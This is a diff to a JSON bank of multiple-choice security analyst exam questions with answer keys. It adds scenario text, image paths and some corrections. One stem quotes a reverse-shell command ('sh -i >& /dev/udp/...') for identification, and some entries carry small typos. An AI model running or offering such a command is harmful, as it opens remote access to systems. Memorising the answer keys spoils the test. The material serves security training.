@@ -1,6 +1,6 @@
 [
   {
-    "question": "Which of the following is the cause of this issue?",
+    "question": "An analyst is conducting routine vulnerability assessments on the company infrastructure. When performing these scans, a business-critical server crashes, and the cause is traced back to the vulnerability scanner.\n\nWhich of the following is the cause of this issue?",
     "choices": {
       "A": "The scanner is running without an agent installed.",
       "B": "The scanner is running in active mode.",
@@ -8,14 +8,29 @@
       "D": "The scanner is configured with a scanning window"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen1.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following approaches will best minimize the risk of the outdated servers being compromised?",
+    "question": "A recent audit of the vulnerability management program outlined the finding for increased awareness of secure coding practices. Which of the following would be best to address the finding?",
+    "choices": {
+      "A": "Establish quarterly SDLC training on the top vulnerabilities for developers",
+      "B": "Conduct a yearly inspection of the code repositories and provide the report to management.",
+      "C": "Hire an external penetration test of the network",
+      "D": "Deploy more vulnerability scanners for increased coverage"
+    },
+    "image_question": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen10.jpg",
+    "image_statement": "",
+    "answer": [
+      "A"
+    ]
+  },
+  {
+    "question": "The security analyst received the monthly vulnerability report. The following findings were included in the report:\n\n● Five of the systems only required a reboot to finalize the patch application\n● Two of the servers are running outdated operating systems and cannot be patched\n\nThe analyst determines that the only way to ensure these servers cannot be compromised is to isolate them.\n\nWhich of the following approaches will best minimize the risk of the outdated servers being compromised?",
     "choices": {
       "A": "Compensating controls",
       "B": "Due diligence",
@@ -23,14 +38,14 @@
       "D": "Passive discovery"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen100.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following steps is most important during the transition between the two analysts?",
+    "question": "An incident response analyst is taking over an investigation from another analyst. The investigation has been going on for the past few days. Which of the following steps is most important during the transition between the two analysts?",
     "choices": {
       "A": "Identify and discuss the lessons learned with the prior analyst.",
       "B": "Accept all findings and continue to investigate the next item target.",
@@ -38,14 +53,14 @@
       "D": "Validate the root cause from the prior analyst."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen101.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following would best address this issue?",
+    "question": "A recent penetration test discovered that several employees were enticed to assist attackers by visiting specific websites and running downloaded files when prompted by phone calls. Which of the following would best address this issue?",
     "choices": {
       "A": "Increasing training and awareness for all staff",
       "B": "Ensuring that malicious websites cannot be visited",
@@ -53,14 +68,14 @@
       "D": "Disabling all staff members’ ability to run downloaded applications"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen102.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following methods should be used to resolve this issue?",
+    "question": "A security administrator has been notified by the IT operations department that some vulnerability reports contain an incomplete list of findings. Which of the following methods should be used to resolve this issue?",
     "choices": {
       "A": "Credentialed scan",
       "B": "External scan",
@@ -68,14 +83,14 @@
       "D": "Network scan"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen103.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following best represents what occurred?",
+    "question": "An organization enabled a SIEM rule to send an alert to a security analyst distribution list when ten failed logins occur within one minute. However, the control was unable to detect an attack with nine failed logins. Which of the following best represents what occurred?",
     "choices": {
       "A": "False positive",
       "B": "True negative",
@@ -83,14 +98,14 @@
       "D": "True positive"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen104.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following best represents what occurred?",
+    "question": "An organization enabled a SIEM rule to send an alert to a security analyst distribution list when ten failed logins occur within one minute. However, the control was unable to detect an attack with nine failed logins.\n\nWhich of the following best represents what occurred?",
     "choices": {
       "A": "False positive",
       "B": "True negative",
@@ -98,14 +113,14 @@
       "D": "True positive"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen105.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of following best fits the type of scanning activity requested?",
+    "question": "A cybersecurity analyst is tasked with scanning a web application to understand where the scan will go and whether there are URIs that should be denied access prior to more in-depth scanning. Which of following best fits the type of scanning activity requested?",
     "choices": {
       "A": "Uncredentialed scan",
       "B": "Discovery scan",
@@ -113,7 +128,7 @@
       "D": "Credentialed scan"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen106.jpg",
     "image_statement": "",
     "answer": [
       "B"
@@ -128,25 +143,10 @@
       "D": "Organizational governance"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen107.jpg",
     "image_statement": "",
     "answer": [
-      "A"
-    ]
-  },
-  {
-    "question": "Which of the following would be best to address the finding?",
-    "choices": {
-      "A": "Establish quarterly SDLC training on the top vulnerabilities for developers",
-      "B": "Conduct a yearly inspection of the code repositories and provide the report to management.",
-      "C": "Hire an external penetration test of the network",
-      "D": "Deploy more vulnerability scanners for increased coverage"
-    },
-    "image_question": "",
-    "image_solution": "",
-    "image_statement": "",
-    "answer": [
-      "A"
+      "C"
     ]
   },
   {
@@ -158,14 +158,14 @@
       "D": "Review threat feeds after viewing the SIEM alert"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen108.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following controls would be most effective to reduce the rate of success of such attempts?",
+    "question": "An organization's threat intelligence team notes a recent trend in adversary privilege escalation procedures. Multiple threat groups have been observed utilizing native Windows tools to bypass system controls and execute commands with privileged credentials.\n\nWhich of the following controls would be most effective to reduce the rate of success of such attempts?",
     "choices": {
       "A": "Set user account control protection to the most restrictive level on all devices",
       "B": "Implement MFA requirements for all internal resources",
@@ -173,14 +173,14 @@
       "D": "Implement controls to block execution of untrusted applications"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen109.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following recommendations should the company align their security controls around?",
+    "question": "A Chief Information Security Officer wants to map all the attack vectors that the company faces each day.\n\nWhich of the following recommendations should the company align their security controls around?",
     "choices": {
       "A": "OSSTMM",
       "B": "Diamond Model of Intrusion Analysis",
@@ -188,7 +188,7 @@
       "D": "MITRE ATT&CK"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen11.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -203,14 +203,14 @@
       "D": "Tabletop exercise"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen110.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is potentially occurring?",
+    "question": "After completing a review of network activity, the threat hunting team discovers a device on the network that sends an outbound email via a mail client to a non-company email address daily at 10:00 p.m.\n\nWhich of the following is potentially occurring?",
     "choices": {
       "A": "Irregular peer-to-peer communication",
       "B": "Rogue device on the network",
@@ -218,14 +218,14 @@
       "D": "Data exfiltration"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen111.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is the next step for the analyst to take?",
+    "question": "A web application team notifies a SOC analyst that there are thousands of HTTP/404 events on the public-facing web server.\n\nWhich of the following is the next step for the analyst to take?",
     "choices": {
       "A": "Instruct the firewall engineer that a rule needs to be added to block this external server",
       "B": "Escalate the event to an incident and notify the SOC manager of the activity",
@@ -233,7 +233,7 @@
       "D": "Identify the IP/hostname for the requests and look at the related activity"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen112.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -248,14 +248,14 @@
       "D": "Scope"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen113.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is an example of a tool that can produce such evidence?",
+    "question": "A security analyst needs to provide evidence of regular vulnerability scanning on the company's network for an auditing process. Which of the following is an example of a tool that can produce such evidence?",
     "choices": {
       "A": "OpenVAS",
       "B": "Burp Suite",
@@ -263,14 +263,14 @@
       "D": "Wireshark"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen114.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following is the best step for the security team to take to ensure compliance with the request?",
+    "question": "An organization receives a legal hold request from an attorney. The request pertains to emails related to a disputed vendor contract.\n\nWhich of the following is the best step for the security team to take to ensure compliance with the request?",
     "choices": {
       "A": "Publicly disclose the request to other vendors",
       "B": "Notify the departments involved to preserve potentially relevant information",
@@ -278,22 +278,22 @@
       "D": "Back up the mailboxes on the server and provide the attorney with a copy"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen115.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following represents the least impactful risk, given the CVSS3.1 base scores?",
+    "question": "A vulnerability analyst received a list of system vulnerabilities and needs to evaluate the relevant impact of the exploits on the business. Given the constraints of the current sprint, only three can be remediated.\n\nWhich of the following represents the least impactful risk, given the CVSS3.1 base scores?",
     "choices": {
       "A": "AV:C:H/PR:H/UI:R/S:U/C:H/I:H/A:L - Base Score 6.0",
       "B": "AV:C:H/PR:H/UI:N/S:C/C:H/I:H/A:L - Base Score 7.2",
       "C": "AV:C:H/PR:H/UI:R/S:U/C:H/I:A:H - Base Score 6.4",
-      "D": "AV:C:H/PR:N/UI:N/S:C/C:C/I:L/A:L - Base Score 6.5"
+      "D": "AV:C:H/PR:N/UI:N/S:C/C:L/I:L/A:L - Base Score 6.5"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen116.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -308,14 +308,14 @@
       "D": "Review regulatory compliance with public relations for official notification"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen117.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is the best technique to perform the analysis?",
+    "question": "A security analyst received a malicious binary file to analyze.\n\nWhich of the following is the best technique to perform the analysis?",
     "choices": {
       "A": "Code analysis",
       "B": "Static analysis",
@@ -323,14 +323,14 @@
       "D": "Fuzzing"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen118.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
+    "question": "An incident response team found IoCs in a critical server. The team needs to isolate and collect technical evidence for further investigation. Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
     "choices": {
       "A": "Hard disk",
       "B": "Primary boot partition",
@@ -338,7 +338,7 @@
       "D": "Routing table"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen119.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -353,7 +353,7 @@
       "D": "Card issuer"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen12.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -368,14 +368,14 @@
       "D": "Quantity of intrusion attempts"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen120.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following implications should be considered on the new hybrid environment?",
+    "question": "A company is implementing a vulnerability management program and moving from an on-premises environment to a hybrid IaaS cloud environment.\n\nWhich of the following implications should be considered on the new hybrid environment?",
     "choices": {
       "A": "The current scanners should be migrated to the cloud",
       "B": "Cloud-specific misconfigurations may not be detected by the current scanners",
@@ -383,14 +383,14 @@
       "D": "Vulnerability scans on cloud environments should be performed from the cloud"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen121.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
+    "question": "A security alert was triggered when an end user tried to access a website that is not allowed per organizational policy. Since the action is considered a terminable offense, the SOC analyst collects the authentication logs, web logs, and temporary files, reflecting the web searches from the user's workstation, to build the case for the investigation. Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
     "choices": {
       "A": "Create a timeline of events detailing the date stamps, user account hostname and IP information associated with the activities",
       "B": "Ensure that the case details do not reflect any user-identifiable information Password protect the evidence and restrict access to personnel related to the investigation",
@@ -398,14 +398,14 @@
       "D": "Notify the SOC manager for awareness after confirmation that the activity was intentional"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen122.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following should be the next step in the remediation process?",
+    "question": "A technician identifies a vulnerability on a server and applies a software patch. Which of the following should be the next step in the remediation process?",
     "choices": {
       "A": "Testing",
       "B": "Implementation",
@@ -413,14 +413,14 @@
       "D": "Rollback"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen123.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following best describes what the security program did?",
+    "question": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to jump between tools.\n\nWhich of the following best describes what the security program did?",
     "choices": {
       "A": "Data enrichment",
       "B": "Security control plane",
@@ -428,7 +428,7 @@
       "D": "Single pane of glass"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen124.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -443,7 +443,7 @@
       "D": "To define how each employee will be contacted after an event occurs"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen125.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -458,14 +458,14 @@
       "D": "To establish the department that is responsible for responding to an incident"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen126.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following factors would an analyst most likely communicate as the reason for this escalation?",
+    "question": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware.\n\nWhich of the following factors would an analyst most likely communicate as the reason for this escalation?",
     "choices": {
       "A": "Scope",
       "B": "Weaponization",
@@ -473,7 +473,7 @@
       "D": "Asset value"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen127.jpg",
     "image_statement": "",
     "answer": [
       "B"
@@ -488,7 +488,7 @@
       "D": "Interview the witnesses"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen128.jpg",
     "image_statement": "",
     "answer": [
       "B"
@@ -499,18 +499,18 @@
     "choices": {
       "A": "The lead should review what is documented in the incident response policy or plan",
       "B": "Management level members of the CSIRT should make that decision",
-      "C": "The lead has the authority to decide who to communicate with at any time",
+      "C": "The lead has the authority to decide who to communicate with at any t me",
       "D": "Subject matter experts on the team should communicate with others within the specified area of expertise"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen129.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following will produce the data needed for the briefing?",
+    "question": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization.\n\nWhich of the following will produce the data needed for the briefing?",
     "choices": {
       "A": "Firewall logs",
       "B": "Indicators of compromise",
@@ -518,14 +518,14 @@
       "D": "Access control lists"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen13.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following describes what the analyst has noticed?",
+    "question": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the header to a known-malicious IP in another country.\n\nWhich of the following describes what the analyst has noticed?",
     "choices": {
       "A": "Beaconing",
       "B": "Cross-site scripting",
@@ -533,14 +533,14 @@
       "D": "PHP traversal"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen130.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following can the analyst perform to see the entire contents of the downloaded files?",
+    "question": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst sets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list pane is not showing the packets containing the file transfer itself.\n\nWhich of the following can the analyst perform to see the entire contents of the downloaded files?",
     "choices": {
       "A": "Change the display filter to ftp.active.port",
       "B": "Change the display filter to tcp.port==20",
@@ -548,14 +548,14 @@
       "D": "Navigate to the File menu and select FTP from the Export objects option"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen131.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
+    "question": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago: but the report did not have a follow-up remediation response from an analyst.\n\nWhich of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
     "choices": {
       "A": "SLA",
       "B": "MOU",
@@ -563,7 +563,7 @@
       "D": "Limitation of liability"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen14.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -578,14 +578,14 @@
       "D": "Delivery"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen15.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following would best meet this requirement?",
+    "question": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a vulnerability scanning method with reduced network traffic.\n\nWhich of the following would best meet this requirement?",
     "choices": {
       "A": "External",
       "B": "Agent-based",
@@ -593,14 +593,14 @@
       "D": "Credentialed"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen16.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is being attempted?",
+    "question": "A security analyst detects an exploit attempt containing the following command: sh -i >& /dev/udp/10.1.1.1/4821 0>&1\n\nWhich of the following is being attempted?",
     "choices": {
       "A": "RCE",
       "B": "Reverse shell",
@@ -608,14 +608,14 @@
       "D": "SQL injection"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen17.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following steps of the process does this describe?",
+    "question": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the system.\n\nWhich of the following steps of the process does this describe?",
     "choices": {
       "A": "Eradication",
       "B": "Recovery",
@@ -623,14 +623,14 @@
       "D": "Preparation"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen18.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
+    "question": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team access to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
     "choices": {
       "A": "Credentialed network scanning",
       "B": "Passive scanning",
@@ -638,14 +638,14 @@
       "D": "Dynamic scanning"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen19.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following security controls would best support the company in this scenario?",
+    "question": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture against this threat. Which of the following security controls would best support the company in this scenario?",
     "choices": {
       "A": "Implement step-up authentication for administrators",
       "B": "Improve employee training and awareness",
@@ -653,7 +653,7 @@
       "D": "Deploy mobile device management"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen2.jpg",
     "image_statement": "",
     "answer": [
       "B"
@@ -668,14 +668,14 @@
       "D": "Decide on the color scheme that will effectively communicate the metrics"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen20.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following actions would allow the analyst to achieve the objective?",
+    "question": "A security analyst is performing an investigation involving multiple targeted Windows malware binaries. The analyst wants to gather intelligence without disclosing information to the attackers.\n\nWhich of the following actions would allow the analyst to achieve the objective?",
     "choices": {
       "A": "Upload the binary to an air gapped sandbox for analysis",
       "B": "Send the binaries to the antivirus vendor",
@@ -683,7 +683,7 @@
       "D": "Query the file hashes using VirusTotal"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen21.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -698,14 +698,14 @@
       "D": "OWASP"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen22.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following risk management principles did the CISO select?",
+    "question": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score would be too high. The CISO refused the software request.\n\nWhich of the following risk management principles did the CISO select?",
     "choices": {
       "A": "Avoid",
       "B": "Transfer",
@@ -713,7 +713,7 @@
       "D": "Mitigate"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen23.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -728,14 +728,14 @@
       "D": "Discuss the financial impact of the incident to determine if security controls are well spent"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen24.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following will best achieve the goal and maximize results?",
+    "question": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals. Which of the following will best achieve the goal and maximize results?",
     "choices": {
       "A": "Single pane of glass",
       "B": "Single sign-on",
@@ -743,7 +743,7 @@
       "D": "Deduplication"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen25.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -758,14 +758,14 @@
       "D": "STIX/TAXII"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen26.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following must be collected first in a computer system, related to its volatility level?",
+    "question": "During an incident, an analyst needs to acquire evidence for later investigation.\n\nWhich of the following must be collected first in a computer system, related to its volatility level?",
     "choices": {
       "A": "Disk contents",
       "B": "Backup data",
@@ -773,14 +773,14 @@
       "D": "Running processes"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen27.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following would be the best action for the incident response team to recommend?",
+    "question": "Joe, a leading sales person at an organization, has announced on social media that he is leaving his current role to start a new company that will compete with his current employer. Joe is soliciting his current employer's customers. However, Joe has not resigned or discussed this with his current supervisor yet.\n\nWhich of the following would be the best action for the incident response team to recommend?",
     "choices": {
       "A": "Isolate Joe's PC from the network",
       "B": "Reimage the PC based on standard operating procedures",
@@ -788,14 +788,14 @@
       "D": "Perform no action until HR or legal counsel advises on next steps"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen28.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is the best priority based on common attack frameworks?",
+    "question": "The Chief Information Security Officer is directing a new program to reduce attack surface risks and threats as part of a zero trust approach. The IT security team is required to come up with priorities for the program. Which of the following is the best priority based on common attack frameworks?",
     "choices": {
       "A": "Reduce the administrator and privileged access accounts",
       "B": "Employ a network-based IDS",
@@ -803,44 +803,45 @@
       "D": "Enable SSO to enterprise applications"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen29.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following actions should the analyst take first?",
+    "question": "During an extended holiday break, a company suffered a security incident. This information was properly relayed to appropriate personnel in a timely manner and the server was up to date and configured with appropriate auditing and logging. The Chief Information Security Officer wants to find out precisely what happened.\n\nWhich of the following actions should the analyst take first?",
     "choices": {
       "A": "Clone the virtual server for forensic analysis",
-      "B": "Log m to the affected server and begin analysis of the logs",
+      "B": "Log in to the affected server and begin analysis of the logs",
       "C": "Restore from the last known-good backup to confirm there was no loss of connectivity",
       "D": "Shut down the affected server immediately"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen3.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following is the most likely explanation?",
+    "question": "A systems administrator is reviewing after-hours traffic flows from data-center servers and sees regular outgoing HTTPS connections from one of the servers to a public IP address. The server should not be making outgoing connections after hours. Looking closer, the administrator sees this traffic pattern around the clock during work hours as well.\n\nWhich of the following is the most likely explanation?",
     "choices": {
       "A": "C2 beaconing activity",
       "B": "Data exfiltration",
       "C": "Anomalous activity on unexpected ports",
-      "D": "Network host IP address scanning"
+      "D": "Network host IP address scanning",
+      "E": "A rogue network device"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen30.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following will the SOC manager most likely recommend to help ensure new employees are accountable for following the company policy?",
+    "question": "New employees in an organization have been consistently plugging in personal webcams despite the company policy prohibiting use of personal devices. The SOC manager discovers that new employees are not aware of the company policy. Which of the following will the SOC manager most likely recommend to help ensure new employees are accountable for following the company policy?",
     "choices": {
       "A": "Human resources must email a copy of a user agreement to all new employees",
       "B": "Supervisors must get verbal confirmation from new employees indicating they have read the user agreement",
@@ -848,14 +849,14 @@
       "D": "All new employees must sign a user agreement to acknowledge the company security policy"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen31.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following would be the best threat intelligence source to learn about this new campaign?",
+    "question": "An analyst has been asked to validate the potential risk of a new ransomware campaign that the Chief Financial Officer read about in the newspaper. The company is a manufacturer of a very small spring used in the newest fighter jet and is a critical piece of the supply chain for this aircraft.\n\nWhich of the following would be the best threat intelligence source to learn about this new campaign?",
     "choices": {
       "A": "Information sharing organization",
       "B": "Blogs/forums",
@@ -863,14 +864,14 @@
       "D": "Deep/dark web"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen32.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following is the most likely reason to include lessons learned?",
+    "question": "An incident response team finished responding to a significant security incident. The management team has asked the lead analyst to provide an after-action report that includes lessons learned.\n\nWhich of the following is the most likely reason to include lessons learned?",
     "choices": {
       "A": "To satisfy regulatory requirements for incident reporting",
       "B": "To hold other departments accountable",
@@ -878,14 +879,14 @@
       "D": "To highlight the notable practices of the organization's incident response team"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen33.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following has the user become?",
+    "question": "A user downloads software that contains malware onto a computer that eventually infects numerous other systems.\n\nWhich of the following has the user become?",
     "choices": {
       "A": "Hacktivist",
       "B": "Advanced persistent threat",
@@ -893,14 +894,14 @@
       "D": "Script kiddie"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen34.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following should the CSIRT conduct next?",
+    "question": "An organization has activated the CSIRT. A security analyst believes a single virtual server was compromised and immediately isolated from the network.\n\nWhich of the following should the CSIRT conduct next?",
     "choices": {
       "A": "Take a snapshot of the compromised server and verify its integrity",
       "B": "Restore the affected server to remove any malware",
@@ -908,14 +909,14 @@
       "D": "Research the malware strain to perform attribution"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen35.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following is the best method to ensure the data on the device is not modified?",
